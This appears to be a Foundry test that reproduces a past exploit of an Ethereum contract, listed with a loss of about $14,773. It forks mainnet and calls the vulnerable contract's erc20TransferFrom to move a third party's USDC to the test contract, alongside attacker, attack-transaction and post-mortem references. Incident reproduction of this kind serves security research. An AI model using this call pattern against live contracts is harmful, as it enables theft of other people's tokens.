// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : $14,773.35
// Attacker : https://etherscan.io/address/0xfde0d1575ed8e06fbf36256bcdfa1f359281455a
// Attack Contract : https://etherscan.io/address/0x6980a47bee930a4584b09ee79ebe46484fbdbdd0
// Vulnerable Contract : https://etherscan.io/address/0x43dc865e916914fd93540461fde124484fbf8faa
// Attack Tx : https://etherscan.io/tx/0x7f2540af4a1f7b0172a46f5539ebf943dd5418422e4faa8150d3ae5337e92172

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x43dc865e916914fd93540461fde124484fbf8faa#code

// @Analysis
// Post-mortem : https://x.com/d23e_AG/status/1849064161017225645
// Twitter Guy : https://x.com/d23e_AG/status/1849064161017225645
// Hacking God : https://x.com/d23e_AG/status/1849064161017225645
pragma solidity ^0.8.0;

interface I {
    function erc20TransferFrom(address, address, address, uint256) external;
}

contract Erc20transfer is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 21_019_771;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    }

    function testExploit() public balanceLog {
        I(0x43Dc865E916914FD93540461FdE124484FBf8fAa).erc20TransferFrom(
            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, address(this), 0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5, 0
        );
    }
}
